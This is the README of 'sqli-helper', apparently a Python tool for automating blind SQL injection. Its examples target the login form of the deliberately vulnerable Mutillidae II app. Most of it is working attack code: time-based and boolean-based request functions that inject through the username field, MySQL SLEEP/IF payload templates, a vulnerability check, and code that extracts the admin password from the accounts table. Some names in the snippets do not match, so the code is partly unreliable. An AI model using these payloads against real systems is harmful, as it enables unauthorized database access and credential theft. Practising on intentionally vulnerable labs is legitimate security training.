# sqli-helper
Python module for speed-up SQLI exploitation (Blind or other)

The extraction use [Binary search algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm) for define which candidate is the good value.

## Usages
(the examples are for Login of [mutillidae II](https://github.com/webpwnized/mutillidae) )

### Define the function who execute the requests

This fuction must match to `(request: str) -> bool`.

This function include then target specific logic (encodage, token, method, ...)

##### Time Based Injection 

```python
sleep_duration = 1

def exec_request(request: str) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' AND {request} #",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers)
    return res.elapsed.seconds >= sleep_duration
```
##### Boolean Based Injection

```python
def exec_request(payload: str) -> bool:
    url = "http://meta.local/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' {payload}",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    res = requests.post(url, data=datas, headers=headers, allow_redirects=False)
    return res.status_code == 302
```

### Check if target is vulnerable for payload

```python
# define the template of the Injection
# Basis MySQL Time based template
template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(($request)$test,{sleep_duration},0))))a) # ')
# Basis MySQL Boolean based template
# template = string.Template('OR ($request)$test # ')

helper = SqliHelper(MySqlConfig(), exec_request)
# Is target vulnerable ?
if(helper.check("SELECT 1")):
    print("Target is Vulnerable")
else:
    print("Target is not Vulnerable")
    exit()
```

### Exctract Data from a cell 
```python
# define the template of the Injection
# Extract text MySQL Time based template
template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a) # ')
# Extract text MySQL Boolean based template
# template = string.Template('OR ORD(MID(($request),$index,1))$test # ')

# extract pass
# the expected values are ASCII alphanum
candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)

binder.prepare_new(candidates, template=template)

result = binder.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
print("pass for 'admin' : ", "".join(map(chr, result)))
```

More examples in 'example' folder

## Legal disclaimer

Use of this script for attacking a target without mutual consent is illegal. It's is the end user responsibility to obey all applicables laws for his location Developers assume no lisibility and are not responsible for any misuse or domage caused by this program
